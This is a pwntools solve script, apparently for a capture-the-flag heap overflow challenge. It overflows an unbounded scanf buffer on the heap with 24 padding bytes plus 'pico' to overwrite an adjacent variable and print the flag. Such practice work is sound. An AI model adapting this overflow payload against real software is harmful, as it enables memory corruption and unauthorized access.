from pwn import *

# The binary to exploit
binary = './chall'

# Start the process
p = process(binary)

# The goal is to overwrite 'safe_var' with 'pico'.
# The program allocates two chunks:
# 1. input_data = malloc(5)
# 2. safe_var = malloc(5)
#
# We can write to input_data with scanf("%s", ...), which allows an overflow.
# We need to find the right amount of padding to fill input_data's chunk
# and start overwriting safe_var's data.
#
# Heap chunks have metadata. For small bins in glibc, the size of the chunk
# is aligned. A 5-byte request on a 64-bit system might get a chunk of size
# 0x20 (32 bytes). The metadata is typically 8 or 16 bytes.
# Let's try a simple payload first. We'll send enough bytes to fill the first
# buffer and its padding, and then the string "pico".
#
# After some local testing, it seems the distance between the start of the
# user data in the first chunk and the start of the user data in the second
# chunk is 24 bytes.
# So, we send 24 bytes of junk, followed by "pico".

payload = b'A' * 24 + b'pico'

# 1. Select option '2' to write to the buffer
log.info("Choosing option 2 to write to buffer")
p.sendlineafter(b'Enter your choice: ', b'2')

# 2. Send the payload
log.info(f"Sending payload: {payload}")
p.sendlineafter(b'Data for buffer: ', payload)

# 3. Select option '4' to print the flag
log.info("Choosing option 4 to print the flag")
p.sendlineafter(b'Enter your choice: ', b'4')

# 4. Get the flag
p.recvuntil(b'YOU WIN\n')
flag = p.recvline()
log.success(f"Flag: {flag.decode().strip()}")

p.close()
